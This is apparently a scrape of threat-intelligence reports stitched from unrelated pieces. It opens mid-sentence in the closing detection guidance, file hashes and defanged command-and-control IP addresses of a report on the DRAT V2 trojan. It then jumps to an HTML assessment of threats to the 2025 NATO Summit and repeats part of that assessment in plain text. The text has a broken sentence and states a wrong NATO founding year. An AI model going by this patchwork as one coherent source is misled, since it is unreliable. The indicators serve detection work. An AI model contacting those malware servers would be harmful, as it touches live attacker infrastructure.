destination ports used by DRAT V2 for C2 operations, such as 3232, 6372, and 7771.

Emphasize traffic decoding and inspection, especially over TCP sessions established to unusual ports.\nUse the detection rules in this report to identify DRAT V2 execution and persistence via registry run keys, file-based loaders, and encoded C2 patterns. Deploy custom YARA rules to detect both .NET and Delphi-compiled DRAT samples.\nDeploy detection logic to monitor , which invokes remote scripts or launches secondary payloads. This is a key component in the infection chain, where malicious HTA scripts fetch and launch DRAT loaders like BroaderAspect.\nMonitor registry modification events, particularly those involving HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run. TAG-140 uses these for persistence by executing DRAT V2 via disguised filenames in C:\\Users\\Public</span>.\nOutlook\nTAG-140’s deployment of DRAT V2 is consistent with the group’s long-standing practice of maintaining a broad and interchangeable suite of remote access trojans. This continued diversification complicates attribution, detection, and monitoring activity. DRAT V2 appears to be another modular addition rather than a definitive evolution, reinforcing the likelihood that TAG-140 will persist in rotating RATs across campaigns to obscure signatures and maintain operational flexibility.\nDespite these challenges, the DRAT V2 infection chain exhibits limited use of defensive evasion or anti-analysis techniques. The absence of code obfuscation, sandbox evasion, or complex loader behaviors increases the feasibility of early detection through basic telemetry and static analysis. Security teams should anticipate continued experimentation with malware tooling and infection chains. Monitoring for spearphishing infrastructure, loader reuse, and behavioral indicators, rather than specific malware families, will be critical in sustaining visibility into TAG-140 activity.\nAppendix A: Indicators of Compromise\nDRAT V2\nce98542131598b7af5d8aa546efe8c33a9762fb70bff4574227ecaed7fff8802\n0d68012308ea41c6327eeb73eea33f4fb657c4ee051e0d40a3ef9fc8992ed316\nc73d278f7c30f8394aeb2ecbf8f646f10dcff1c617e1583c127e70c871e6f8b7\nDRAT\n830cd96aba6c328b1421bf64caa2b64f9e24d72c7118ff99d7ccac296e1bf13d\nc328cec5d6062f200998b7680fab4ac311eafaf805ca43c487cda43498479e60\nDRAT V2 C2\n185[.]117[.]90[.]212:7771\n154[.]38[.]175[.]83:3232\n178[.]18[.]248[.]36:6372\nDRAT C2\n38[.]242[.]149[.]89:61101\nAppendix B: DRAT V2 Command Parameters and Response\nSystem Information\nThe initial_infotonas command initiates system-level reconnaissance by requesting host environment details, including username, OS version, timestamp, and working directory.

With each member’s head of state or government in attendance, the summit represents a high-profile diplomatic event taking place amid heightened geopolitical uncertainty and internal alliance tensions. Key issues, such as the ongoing war in Ukraine, economic volatility, rising Euroscepticism, and concern over the United States’ (US) commitment to NATO going forward, are all likely to dominate the agenda.</p>\n        <p>The complex geopolitical backdrop of the 2025 NATO Summit almost certainly increases its appeal as a target for a wide spectrum of threat actors, including state-sponsored influence operations groups and cyber threat actors, cybercriminals, and hacktivists. Insikt Group assesses that malign influence operations, cyber-espionage activity, and a measurable uptick in cybercriminal and hacktivist activity likely represent the three primary threat vectors to the 2025 NATO Summit. Russian and Chinese influence networks will almost certainly seek to exploit the summit to amplify perceptions of NATO disunity and undermine its credibility as a reliable security partner. In parallel, Russian state-sponsored cyber actors are highly likely to conduct targeted espionage against NATO-affiliated entities and personnel, while Chinese cyber threat actors are more likely to pursue opportunistic intrusions to glean insight into alliance policies and future planning. Hacktivist and cybercriminal actors are already attempting to capitalize on the summit’s geopolitical visibility for financial gain and political messaging, based on closed forum references to NATO and ongoing targeting of NATO member states.</p>\n        <p>Security officials are simultaneously preparing extensive physical security measures to safeguard the event. While direct attacks on the summit by Russian hybrid actors –– encompassing conventional and irregular military forces –– are unlikely, tactics such as sabotage, vandalism, weaponized migration, and provocative military signaling will very likely continue to pressure NATO member states around the time of the event, particularly allies in Eastern Europe. At the time of publication, Insikt Group assesses that protests during the summit are very likely, but risks associated with protest activities are largely mitigated through proactive security measures. Additionally, we have not observed any credible evidence suggesting that violent non-state actors are planning or expressing intent to target the summit.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>We assess NATO’s ability to project unified geopolitical and military strength is likely more uncertain than any time in recent years, driven by US rhetoric questioning the alliance’s utility, rising political influence of Eurosceptic far right parties in several NATO member states, and Russia’s continued efforts to undermine NATO unity via its military campaign in Ukraine and hybrid sabotage and influence operations in Europe.</li>\n          <li>Russian hybrid threats, including sabotage of critical infrastructure, vandalism, weaponized migration, and coercive military posturing, will very likely continue to target European countries ahead of and following the 2025 NATO Summit, particularly if the summit results in significant action regarding Ukraine –– with the Baltic states, Poland, and Germany likely at highest risk.</li>\n          <li>Both Russia and China’s own influence ecosystems will almost certainly attempt to shape public opinion around the 2025 NATO Summit by portraying the alliance as aggressive, divisive, and divided.</li>\n          <li>Malign influence actors, particularly from Russia, are likely to use artificial intelligence (AI)-generated media in an effort to discredit NATO leadership, delegitimize summit outcomes, and further inflame tensions among member states.</li>\n          <li>Cybercriminal and hacktivist activity referencing NATO has surged across dark web and special-access forums in the months leading up to the 2025 NATO Summit, very likely signaling a heightened risk of ideologically driven and financially motivated multi-vector campaigns targeting NATO member states and defense-affiliated entities.</li>\n          <li>Russian state-aligned threat groups, particularly those linked to the SVR, FSB, and GRU, are highly likely to conduct targeted operations against entities and personnel associated with the 2025 NATO Summit.</li>\n          <li>Chinese state-sponsored groups tasked with the collection of foreign intelligence, particularly those under the Ministry of State Security, are likely to engage in some level of opportunistic cyber-espionage operations against select attendees with the goal of understanding summit-related policy discussions and outcomes.</li>\n          <li>The Netherlands’ extensive security posture around the 2025 NATO Summit will very likely mitigate the scope, sophistication, and impact of physical security threats to the event from violent non-state actors, including terrorists, violent extremists, criminal organizations, and disruptive protest movements.</li>\n        </ul>\n        <h2>Strategic Threat Environment</h2>\n        <p>2025 NATO Summit Likely Pivotal for Alliance’s Future Unity</p>\n        <p>The 2025 NATO Summit comes at a time when the alliance’s ability to project unified geopolitical and military strength is likely more uncertain than any time in recent years, driven by US rhetoric questioning the alliance’s utility; rising political influence of Euroskeptic far right parties in several NATO member states; and Russia’s continued efforts to undermine NATO unity via its military campaign in Ukraine, and hybrid sabotage and influence operations in Europe.</p>\n        <p>The US government’s public messaging concerning its commitment to NATO has been inconsistent throughout President Donald Trump’s first and second terms. In 2025, President Trump suggested that the US’s commitment to Article 5 of NATO’s founding treaty would depend on a given NATO state’s defense spending, <a href=\"https://www.theguardian.com/us-news/2025/mar/07/donald-trump-nato-alliance-us-security-support\">stating</a>, “If they don’t pay, I’m not going to defend them.” In contrast, in 2017, President Trump <a href=\"https://www.atlanticcouncil.org/blogs/natosource/exclusive-trump-discovers-article-5-after-disastrous-nato-visit/?utm_source=chatgpt.com\">stated</a>, “Absolutely, I’d be committed to Article 5.”</p>\n        <p>Secretary of State Marco Rubio <a href=\"https://kyivindependent.com/nato-funding-explained-as-trump-mulls-cuts/\">announced</a> that all NATO members will be expected to spend 5% of their GDP on defense over the next decade, an increase from the previous benchmark of 2%. Although Rubio emphasized that the US remains committed to supporting NATO, notes from an internal Trump Administration proposal <a href=\"https://apnews.com/article/state-department-funding-cuts-trump-diplomacy-8305713dc6da1b95811486b62bf46582\">revealed</a> plans to reduce the amount of money the US would contribute to NATO’s budget. The US currently <a href=\"https://www.nato.int/cps/uk/natohq/topics_67655.htm?selectedLocale=en\">provides</a> roughly 16% of the alliance’s funding.</p>\n        <p>In some key NATO states, the rising political <a href=\"https://carnegieendowment.org/research/2024/04/charting-the-radical-rights-influence-on-eu-foreign-policy?center=russia-eurasia&amp;lang=en\">influence</a> of far-right parties that are skeptical of NATO and sympathetic to Russia likely complicates their ability to reinforce NATO commitments. For example, France’s Rassemblement National (RN) has historically advocated for France’s withdrawal from NATO. Though the RN has recently moderated its position, its historically anti-NATO position risks complicating French President Emmanuel Macron’s ability to achieve consensus on increased French defense spending for NATO. Germany’s Alternative für Deutschland (AfD) has questioned NATO’s continued utility and has advocated for closer Germany-Russia ties.</p>\n        <p>Differences in NATO states’ probable responses to Russia’s multi-pronged attempts to weaken NATO and its allies will almost certainly strain NATO’s ability to project a unified response to Russia’s actions. Though NATO has, from its founding in 1945, been primarily concerned with resisting Russian aggression, in the last two years, Russia has significantly escalated its aggression towards NATO and its allies, with Moscow’s full-scale invasion of Ukraine, escalating sabotage operations in NATO territory, and widespread influence operations aimed at undermining public confidence in Western democracy and manipulating elections in favor of pro-Russia candidates.</p>\n        <h4>Profiles of Key Players</h4>\n        <h5>United States — Unpredictable NATO Leader</h5>\n        <p>Inconsistent statements by senior US officials about NATO’s utility and how much to resist Russian aggression likely make it difficult to predict the US’s 2025 NATO Summit priorities, which will have significant influence over the tone of the summit and the text of the Summit Declaration. That said, the US almost certainly will <a href=\"https://www.heritage.org/global-politics/report/what-success-story-looks-top-us-priorities-the-june-2025-nato-summit-the\">call</a> for NATO member states to spend 3.5 to 5% of their GDP on defense, judging from <a href=\"https://www.straitstimes.com/world/united-states/trump-says-nato-members-should-raise-defence-spending-to-5-of-gdp?utm_source=chatgpt.com\">past</a> statements by President Trump. The US is also likely to push for NATO’s increased focus on China-nexus threats to NATO territory, judging from the Trump administration’s emphasis on resisting Chinese global aggression. The US’s inconsistent policies toward Russia — ranging from <a href=\"https://www.bbc.com/news/articles/cg5q0mev07lo\">supporting</a> Russia’s view that Kyiv started the Russia-Ukraine war to <a href=\"https://www.cnn.com/2025/05/27/politics/russia-sanctions-trump-ukraine-war\">calling</a> for additional sanctions on Russia — make it difficult to predict the US’s stance on Russia at the summit. <a href=\"https://www.euractiv.com/section/defence/news/nato-plans-to-sideline-zelenskyy-at-june-summit-to-keep-trump-happy/\">Reporting</a> suggests senior NATO officials — including the NATO Secretary General — are considering deemphasizing Ukraine at the summit, potentially including not inviting Ukrainian President Volodymyr Zelensky, to avoid alienating President Trump. We assess this suggests that at least some NATO states might be willing to compromise on their priorities to ensure the US remains invested in the alliance.</p>\n        <h5>Poland — Concerns about Existential Threats from Moscow Drive Militarization</h5>\n        <p>Poland’s presidential election likely raises questions about Warsaw’s level of support for Ukraine at the 2025 NATO Summit and beyond. Law and Justice (PiS) candidate Karol Nawrocki won the runoff on June 2, 2025. Nawrocki has stated that he would veto Ukraine’s accession to NATO, suggesting Warsaw is likely to be less inclined to support additional NATO aid to Ukraine. However, Nawrocki is likely to remain committed to building up Poland’s military capabilities to resist Russian aggression. Warsaw’s history of being invaded by Russia and Putin’s <a href=\"https://www.legal-tools.org/doc/tt382m/pdf\">rhetoric</a> undermining Poland’s sovereignty almost certainly have led Poland to conclude that NATO strength is one of the only deterrents to Russian aggression within Poland, potentially including territorial incursions. Polish leaders have <a href=\"https://www.politico.eu/article/donald-tusk-plan-train-poland-men-military-service-russia/\">announced</a> plans to increase the size of Poland’s standing army from 200,000 to 500,000 and provide military training to every Polish man.</p>\n        <h5>United Kingdom — Member of Pro-NATO Unity Bloc</h5>\n        <p>The United Kingdom (UK) is likely to strongly <a href=\"https://www.gov.uk/government/speeches/prime-ministers-oral-statement-to-the-house-of-commons-25-february-2025?utm_source=chatgpt.com\">advocate</a> for continued NATO unity to resist threats, including an increase in NATO assistance to Ukraine. The UK has announced a commitment to increase its defense spending to 2.5% of its GDP by 2030. Notably, UK Prime Minister Keir Starmer has <a href=\"https://www.bbc.com/news/articles/clyelpzqn28o\">backed</a> NATO membership for Ukraine despite US objections, suggesting there could be tension between the US and UK on this issue at the summit.</p>\n        <h5>Germany — Member of Pro-NATO Unity Bloc</h5>\n        <p>Germany is likely to be more committed to NATO unity and increased defense spending than it has in previous NATO summits, as it adopts a position similar to that of the UK and France. Senior German officials have <a href=\"https://www.reuters.com/world/berlin-backs-trumps-demand-hike-nato-spending-target-5-2025-05-15/?utm_source=chatgpt.com\">pledged</a> to spend 5% of Germany’s GDP on defense. Merz’s government <a href=\"https://responsiblestatecraft.org/german-defense-spending-increase/\">voted</a> to revise Germany’s constitution to allow increased defense spending and facilitate the largest German rearmament since World War II. Chancellor Merz has also expressed support for Ukraine joining NATO, though he has rejected the idea of sending NATO troops to Ukraine.</p>\n        <h5>France — Member of Pro-NATO Unity Bloc</h5>\n        <p>France’s position at the 2025 NATO Summit is likely to be broadly similar to that of the UK and Germany. French President Emmanuel Macron has <a href=\"https://www.politico.eu/article/macron-urges-europe-to-boost-defense-spending-to-over-3-percent-of-gdp/\">advocated</a> for NATO states to increase their defense spending to 3 to 3.5% of their GDPs. France has <a href=\"https://www.france24.com/en/europe/20250311-european-nato-paris-ukraine?utm_source=chatgpt.com\">called</a> for “credible security guarantees” for Ukraine via a coordinated NATO <a href=\"https://www.lemonde.fr/en/europe/article/2025/03/11/macron-hosts-military-chiefs-from-30-countries-to-discuss-ukraine_6739036_143.html?utm_source=chatgpt.com\">strategy</a>, including a pathway for Ukraine to join NATO. Macron is also likely to <a href=\"https://www.military.com/daily-news/2025/03/04/macron-discuss-nuclear-deterrence-european-allies-look-frances-unique-strategy.html?utm_source=chatgpt.com\">advocate</a> for the expansion of nuclear deterrence measures to strengthen NATO’s defenses.</p>\n        <h5>Hungary — Efforts to Balance NATO Membership with Close Russia Relations Complicate NATO Unity</h5>\n        <p>Hungary is likely to take a multifaceted approach that aims to balance participation in core NATO functions, including defense spending targets and collective defense mechanisms, with avoiding providing direct military assistance to Ukraine, likely to preserve Hungary’s relationship with Russia. Hungary has <a href=\"https://www.belfercenter.org/publication/us-engagement-hungary-reshaping-natos-collective-alliance?utm_source=chatgpt.com\">met</a> NATO’s longtime 2% defense spending target, though its efforts to maintain a positive relationship with Russia are likely to complicate NATO’s ability to project a unified response to Russian aggression. Hungary’s plans to <a href=\"https://www.gbnews.com/news/world/viktor-orban-hungary-nato-membership?utm_source=chatgpt.com\">determine</a> a way to avoid operations outside of NATO territory suggest it could complicate NATO responses to conflicts, even outside of the Russia-Ukraine war.</p>\n        <h5>Türkiye — Pivotal Independent Player, Most Well-Positioned to Influence NATO Priorities</h5>\n        <p>Türkiye’s strong military and unique diplomatic positioning to broker talks with Western powers as well as Russia and China means it likely feels empowered to push NATO to adopt Turkish priorities. For example, Türkiye initially <a href=\"https://foreignpolicy.com/2024/01/28/turkey-sweden-nato-erdogan-foreign-policy-history-us-europe-west/\">opposed</a> Swedish admission into NATO due to Sweden providing asylum for members of the Kurdistan Workers’ Party, a political party Ankara considers a terrorist organization. Türkiye eventually <a href=\"https://www.npr.org/2024/01/27/1227418505/f-16s-turkey-sweden-nato-kurds-greece\">agreed</a> to Swedish admission into NATO after securing key concessions from the US, including F-16 fighter jets.</p>\n        <p>Türkiye <a href=\"https://breakingdefense.com/2024/10/turkish-defense-spending-to-reach-record-high-amid-neighboring-conflicts/\">announced</a> plans in October 2024 to increase its defense and security spending in 2025 to $47 billion, its highest-ever military budget. Ankara has <a href=\"https://www.straitstimes.com/world/europe/turkey-ready-to-host-russia-ukraine-peace-talks-erdogan-tells-putin?utm_source=chatgpt.com\">offered</a> up its services as a mediator in the Russia-Ukraine war, though Ankara’s often close relations with Moscow make it unclear to what extent Türkiye would be able to be a neutral arbiter between Moscow and Kyiv. More broadly, Türkiye is likely to seek NATO support for its own national priorities, including counterterrorism, as well as a lifting of NATO arms embargoes on Türkiye, which Ankara <a href=\"https://nordicmonitor.com/2024/07/erdogan-seeks-lifting-of-unofficial-embargoes-on-turkey-at-nato-summit/?utm_source=chatgpt.com\">argues</a> undermines Turkish defense capabilities.</p>\n        <h3>Hybrid Threats to NATO Member States</h3>\n        <p>Russian hybrid threats –– including sabotage of critical infrastructure, vandalism, weaponized migration, and coercive military posture –– will very likely continue to target European countries ahead of and following the 2025 NATO Summit. While these operations are unlikely to directly target the summit event itself, threats to the critical infrastructure of NATO member countries are likely heightened as Moscow seeks to destabilize member states and exploit divisions within the alliance. Hybrid threats will almost certainly increase their targeting of NATO member countries following the summit if it results in significant action regarding Ukraine, such as a joint commitment to further military aid to Kyiv. In January 2025, the Finnish Defence Forces <a href=\"https://puolustusvoimat.fi/documents/1948673/2014902/PV_sotilastiedustelu_raportti_EN_2025_web.pdf/c0125ed9-1467-23e7-e7b6-a7891c4fb5fe/PV_sotilastiedustelu_raportti_EN_2025_web.pdf\">assessed</a> that Russia “will likely increase the use of all hybrid methods as it seeks to cause disunity within NATO and the European Union,” including cyber and information influencing, coercive use of energy exports, targeting of energy and other critical infrastructure, weaponizing immigration, and intelligence operations.</p>\n        <h4>Russian Hybrid Warfare Units</h4>\n        <p>Insikt Group identified at least five Russian units dedicated to hybrid warfare operations, including sabotage, assassinations, arson attacks, espionage, and recruitment of foreign agents (<strong>Table 1</strong>). The Kremlin also very likely <a href=\"https://www.mi5.gov.uk/director-general-ken-mccallum-gives-latest-threat-update\">employs</a> individuals not directly affiliated with its security or intelligence services to <a href=\"https://tvn24.pl/plus/programy/czarno-na-bialym/szpiedzy-w-polsce-czy-wobec-takiego-zagrozenia-jestesmy-bezradni-reportaz-piotra-swierczka-vc8358848\">conduct</a> hybrid threat activity, in an effort to prevent discovery and complicate attribution. For example, GRU Military Unit 54654 very likely recruits operatives without prior military contracts or connections to the Russian government to avoid identification, including recruiting foreign students studying in Russia, Russian students abroad, and criminal organizations in Russia and abroad.</p>\n        <p>Recent arrests and incidents of potential sabotage across Europe <a href=\"https://www.politico.eu/article/europe-russia-hybrid-war-vladimir-putin-germany-cyberattacks-election-interference/\">indicate</a> that recruits are largely young men, Russian-<a href=\"https://www.theguardian.com/technology/2025/mar/18/russia-criminal-networks-drive-increase-sabotage-europol\">speaking</a> but not Russian citizens, <a href=\"https://www.cia.gov/static/DCIA_Bill_Burns_MI6_Chief_Richard_Moore_with_FT_Editor_Roula_Khalaf_Transcript.pdf\">often</a> with a criminal background and <a href=\"https://www.occrp.org/en/investigation/make-a-molotov-cocktail-how-europeans-are-recruited-through-telegram-to-commit-sabotage-arson-and-murder\">recruited</a> via Telegram. For example, Polish Foreign Minister Radek Sikorski <a href=\"https://www.bbc.com/news/videos/ceqgxv7ejxwo\">stated</a> in an interview that Russia used Telegram to recruit the perpetrators of the May 2024 arson attacks on a Warsaw shopping mall. In March 2025, the Finnish Defence Forces <a href=\"https://puolustusvoimat.fi/documents/1948673/2014902/PV_sotilastiedustelu_raportti_EN_2025_web.pdf/c0125ed9-1467-23e7-e7b6-a7891c4fb5fe/PV_sotilastiedustelu_raportti_EN_2025_web.pdf\">assessed</a> that “attempts to recruit human sources online, and particularly on pro-Russian social media platforms, are likely to become more common.” Similarly, Moscow can also likely co-opt vessels affiliated with its shadow fleet to conduct low-sophistication destructive actions targeting submarine infrastructure, such as anchor dragging, as these assets likely draw less scrutiny.</p>\n        <div>\n          <div>\n            <div><strong>Entity</strong></div>\n            <div><strong>Hierarchy</strong></div>\n            <div><strong>Operations</strong></div>\n          </div>\n          <div>\n            <div>Department of Special Tasks (Департамент специальных задач)</div>\n            <div>\n              <p>Established in 2023 by GRU Deputy Director Andrey Vladimirovich Averyanov and Ivan Sergeevich Kas’ianenko</p>\n              <p>Encompasses GRU units 29155 and 54654</p>\n            </div>\n            <div>Reportedly <a href=\"https://www.wsj.com/world/europe/russia-spy-covert-attacks-8199e376\">responsible</a> for a planned assassination plot targeting Rheinmetall CEO Armin Papperger and explosives planted at DHL logistics centers in 2024</div>\n          </div>\n          <div>\n            <div>GRU Unit 29155 (в/ч 29155)</div>\n            <div>Now under the Department of Special Tasks; led by Averyanov</div>\n            <div>Reportedly involved in bounties on US soldiers in Afghanistan, the 2018 Skripal <a href=\"https://www.bellingcat.com/news/uk-and-europe/2020/10/23/russias-clandestine-chemical-weapons-programme-and-the-grus-unit-21955/\">poisoning</a> and sabotage <a href=\"https://www.france24.com/en/europe/20210420-unit-29155-the-russian-spies-specialising-in-sabotage-and-assassinations\">operations</a>; linked to cyber espionage and Russian influence network CopyCop</div>\n          </div>\n          <div>\n            <div>GRU Unit 54654 (в/ч 54654)</div>\n            <div>Now <a href=\"https://www.csis.org/analysis/russias-shadow-war-against-west\">under</a> Department of Special Tasks</div>\n            <div>Recruits operatives without prior military or government connections; behind “illegals” intelligence programs</div>\n          </div>\n          <div>\n            <div>GRU Unit 54777 (в/ч 54777)</div>\n            <div>Also <a href=\"https://www.congress.gov/crs-product/IF11718\">known</a> as the 72nd Special Service Center</div>\n            <div><a href=\"https://www.congress.gov/crs-product/IF11718\">Conducts</a> psychological operations; exploited Ukraine peace demonstrations in Germany to influence public opinion</div>\n          </div>\n          <div>\n            <div>Main Directorate of Deep Sea Research (Главное управление глубоководных исследований, GUGI)</div>\n            <div>Reports directly to the Ministry of Defense; naval base in Olenya Bay</div>\n            <div>Very likely involved in submarine infrastructure surveillance and sabotage; maintains at least eight nuclear submarines and thirteen ships, including the Yantar, which hosts two deep-sea submarines</div>\n          </div>\n        </div>\n        <p><strong><em>Table 1:</em></strong> <em>Formal Russian government entities affiliated with sabotage or hybrid threat operations (Source: Recorded Future)</em></p>\n        <h5>Sabotage</h5>\n        <p>Russia very likely aims to target European critical infrastructure with hybrid cyber-kinetic operations, regardless of the outcome of current peace negotiations on Ukraine. Based on recent incidents, countries neighboring Russia –– Estonia, Finland, Latvia, Lithuania, and Poland –– likely <a href=\"https://jamestown.org/program/poland-on-the-frontlines-against-russias-shadow-war/?utm_source=All+Subscribers&amp;utm_campaign=cf94211450-EMAIL_CAMPAIGN_2025_02_14_07_49_COPY_01&amp;utm_medium=email&amp;utm_term=0_-a46e3b4ee2-155273798&amp;mc_cid=cf94211450&amp;mc_eid=1d39ed9d2e\">represent</a> the most attractive targets for sabotage operations. Additionally, countries providing the strongest support to Ukraine, such as Germany and Poland, are almost certainly at greater risk of physical threats than countries that do not provide significant aid, such as Hungary, which Moscow is unlikely to directly target. Specifically, Insikt Group assessed in April 2025 that Russia’s threat perception and intent to target European energy entities would likely increase following the European Union (EU)’s <a href=\"https://commission.europa.eu/news/roadmap-fully-end-eu-dependency-russian-energy-2025-05-06_en\">announcement</a> of a framework to eliminate Russian fossil fuel imports by 2027.</p>\n        <p>Russia-directed sabotage attacks targeting the critical infrastructure and key government and military facilities of European countries have almost certainly <a href=\"/research/russian-sabotage-activities-escalate-amid-fraught-tensions\">increased</a> since 2022. Recent incidents suggest that these operations largely involve low-sophistication tactics with a degree of plausible deniability and obfuscated links to Moscow, often initially appearing as accidents or single criminal events, complicating attribution and identification of a larger strategic trend. For example, in March 2025, Polish prosecutors <a href=\"https://www.politico.eu/article/russia-spy-belarusian-refugee-warsaw-mall-fire-prosecutor/\">announced</a> that an alleged Belarusian refugee masquerading as an opposition activist had set fire to a Warsaw supermarket on Russia’s behalf in April 2024, and Lithuanian prosecutors <a href=\"https://www.bbc.com/news/articles/c757kpk21d9o\">attributed</a> an arson attack on an Ikea store in Vilnius in May 2024 to two teenagers recruited by Russia’s Main Directorate of the General Staff of the Armed Forces (GRU). In December 2024, the Federal Prosecutor’s Office in Germany announced charges against three Russian-German nationals for reportedly surveying a US military base in Grafenwöhr, a weapons factory in Bayreuth, and military facilities and railway lines to support sabotage operations using explosives. According to the Center for Strategic and International Studies (CSIS), Russia-directed sabotage attacks in Europe <a href=\"https://www.csis.org/analysis/russias-shadow-war-against-west\">tripled</a> between 2023 and 2024 (from 12 to 34 attacks), after quadrupling between 2022 and 2023 (from 3 to 12 attacks).</p>\n        <h5>Threats to Submarine Cable Infrastructure</h5>\n        <p>Sabotage operations targeting submarine cables off the coast of Europe almost certainly represent a relatively low-effort, high-reward vector for targeting European critical infrastructure. In June 2023, Insikt Group <a href=\"/research/escalating-global-risk-environment-submarine-cables\">assessed</a> that Russia’s ongoing war against Ukraine was very likely fueling physical attacks and intelligence collection efforts against the submarine cable system to undermine the economic, diplomatic, and national security objectives of the US and its NATO allies. Specifically, Russia almost certainly presents the greatest direct threat to submarine cables in the North and Baltic Seas.</p>\n        <p>Insikt Group identified four incidents involving damage to eight submarine cables in the Baltic Sea in 2024 and 2025: January 2025 <a href=\"https://www.svt.se/nyheter/utrikes/uppgifter-om-nytt-kabelbrott-i-ostersjon\">damages</a> to the C-Lion1 cable connecting Germany and Finland; January 2025 <a href=\"https://www.svt.se/nyheter/utrikes/lettland-utreder-sabotage-efter-kabelbrott-utanfor-gotland\">damages</a> to the Sweden-Latvia cable; December 2024 <a href=\"https://www.theguardian.com/world/2024/dec/26/finnish-coastguard-boards-eagle-s-oil-tanker-suspected-of-causing-power-cable-outages\">damages</a> to four submarine internet cables (likely the Finland Estonia Connection 1, Finland Estonia Connection 2, Baltic Sea Submarine Cable, and C-Lion1) and the Estlink-2 power cable; and November 2024 damages to the C-Lion1 and BCS East-West Interlink. Prosecutors have attributed these damages to vessels, some with connections to Russia, dragging their anchors; for example, the Eagle S vessel behind the December 2024 cable cuts is <a href=\"https://www.lloydslist.com/LL1151955/Russia-linked-cable-cutting-tanker-seized-by-Finland-was-loaded-with-spying-equipment\">suspected</a> to be part of Russia’s shadow fleet and reportedly carried surveillance equipment. While none of these incidents caused prolonged outages or communication disruptions due to the availability of alternate routes for data transmission, increased societal concerns about the vulnerability of critical infrastructure had a <a href=\"https://www.rand.org/pubs/commentary/2025/01/countering-russias-shadow-fleet.html\">clear</a> <a href=\"https://katsaus.supo.fi/en/russian-sabotage-in-europe\">psychological</a> <a href=\"https://news.postimees.ee/8255914/vox-populi-of-political-parties-lauri-laanemets-if-russian-ships-reach-estonian-waters-it-is-too-late?cx_testId=25&amp;cx_testVariant=cx_1&amp;cx_artPos=0#cxrecs_s\">impact</a> on northern European populations. A more coordinated attack on submarine critical infrastructure could cause disruptions to business operations, financial losses, and communications disruptions, raising the risk of economic ramifications to northern and eastern Europe. In 2024, Estonian power provider Elering <a href=\"https://www.politico.eu/article/russia-sabotage-undersea-cables-baltic-sea-europe-war/\">reported</a> that energy bills spiked by 10% due to a technical problem with a power cable, with board member Erkki Sapp stating that energy infrastructure can handle any single event, but “if there are several of these sorts of events, then this may lead to issues with security of supply.”</p>\n        <p>In addition to threats to critical infrastructure, Moscow has very likely attempted to <a href=\"https://mwi.westpoint.edu/weaponized-migration-in-eastern-europes-frozen-north-do-not-overlook-russian-hybrid-warfare/\">weaponize</a> refugee flows in an effort to foment domestic unrest and exploit concerns about immigration in countries bordering Russia and Belarus. In October 2024, Poland temporarily <a href=\"https://www.politico.eu/article/poland-prime-minister-donald-tusk-eu-asylum-ban-russia-belarus-migration-security/\">suspended</a> asylum rights for migrants entering the country via Belarus, over concerns that Russia had orchestrated an influx of migrants at that border as part of hybrid tactics to destabilize Poland. Similarly, Finland <a href=\"https://apnews.com/article/finland-russia-border-migration-313b2a1846f4aa4b349fa577ce8c39a4\">closed</a> its last border crossing with Russia in November 2023 after accusing Moscow of facilitating the crossing of approximately 1,000 migrants without valid documentation. Throughout 2021 and 2022, Lithuania <a href=\"https://warsawinstitute.org/tightening-immigration-and-border-policy-initiatives-in-the-baltics/\">documented</a> similar efforts by the Belarusian government to push migrants across the border. As such, the weaponization of migration across Russian and Belarusian borders with NATO member states, particularly Finland, Poland, Estonia, Latvia, and Lithuania, likely remains a viable tactic to attempt to destabilize these countries.</p>\n        <h5>Coercive Military Posture</h5>\n        <p>Russia’s plans to expand its military capabilities near the border with Finland and the Baltic states will very likely focus on increasing military presence and intelligence capabilities. Moscow’s ability to implement these changes has been constrained by its ongoing military operations in Ukraine, although it has already taken several key steps in 2024 –– most notably, the creation of the Leningrad Military District bordering Finland and the Baltics, which Moscow frames as its response to NATO expansion. Russia reportedly <a href=\"https://www.thebarentsobserver.com/news/kola-and-in-karelia-likely-to-get-tens-of-thousands-of-new-soldiers/423579#:~:text=A%20completely%20new%20army%20corps,the%2080th%20Motorised%20Infantry%20Brigade\">aims</a> to increase the size of its armed forces by 350,000 by 2026, of which up to 50,000 will deploy to the Leningrad Military District, potentially <a href=\"https://www.helsinkitimes.fi/finland/finland-news/domestic/25983-russia-s-military-buildup-near-finland-stalls-amid-ukraine-war.html\">increasing</a> troop numbers near Finland from approximately 30,000 to 80,000.

With each member’s head of state or government in attendance, the summit represents a high-profile diplomatic event taking place amid heightened geopolitical uncertainty and internal alliance tensions. Key issues, such as the ongoing war in Ukraine, economic volatility, rising Euroscepticism, and concern over the United States’ (US) commitment to NATO going forward, are all likely to dominate the agenda.\nThe complex geopolitical backdrop of the 2025 NATO Summit almost certainly increases its appeal as a target for a wide spectrum of threat actors, including state-sponsored influence operations groups and cyber threat actors, cybercriminals, and hacktivists. Insikt Group assesses that malign influence operations, cyber-espionage activity, and a measurable uptick in cybercriminal and hacktivist activity likely represent the three primary threat vectors to the 2025 NATO Summit. Russian and Chinese influence networks will almost certainly seek to exploit the summit to amplify perceptions of NATO disunity and undermine its credibility as a reliable security partner. In parallel, Russian state-sponsored cyber actors are highly likely to conduct targeted espionage against NATO-affiliated entities and personnel, while Chinese cyber threat actors are more likely to pursue opportunistic intrusions to glean insight into alliance policies and future planning. Hacktivist and cybercriminal actors are already attempting to capitalize on the summit’s geopolitical visibility for financial gain and political messaging, based on closed forum references to NATO and ongoing targeting of NATO member states.\nSecurity officials are simultaneously preparing extensive physical security measures to safeguard the event. While direct attacks on the summit by Russian hybrid actors –– encompassing conventional and irregular military forces –– are unlikely, tactics such as sabotage, vandalism, weaponized migration, and provocative military signaling will very likely continue to pressure NATO member states around the time of the event, particularly allies in Eastern Europe. At the time of publication, Insikt Group assesses that protests during the summit are very likely, but risks associated with protest activities are largely mitigated through proactive security measures. Additionally, we have not observed any credible evidence suggesting that violent non-state actors are planning or expressing intent to target the summit.\nKey Findings\nWe assess NATO’s ability to project unified geopolitical and military strength is likely more uncertain than any time in recent years, driven by US rhetoric questioning the alliance’s utility, rising political influence of Eurosceptic far right parties in several NATO member states, and Russia’s continued efforts to undermine NATO unity via its military campaign in Ukraine and hybrid sabotage and influence operations in Europe.\nRussian hybrid threats, including sabotage of critical infrastructure, vandalism, weaponized migration, and coercive military posturing, will very likely continue to target European countries ahead of and following the 2025 NATO Summit, particularly if the summit results in significant action regarding Ukraine –– with the Baltic states, Poland, and Germany likely at highest risk.\nBoth Russia and China’s own influence ecosystems will almost certainly attempt to shape public opinion around the 2025 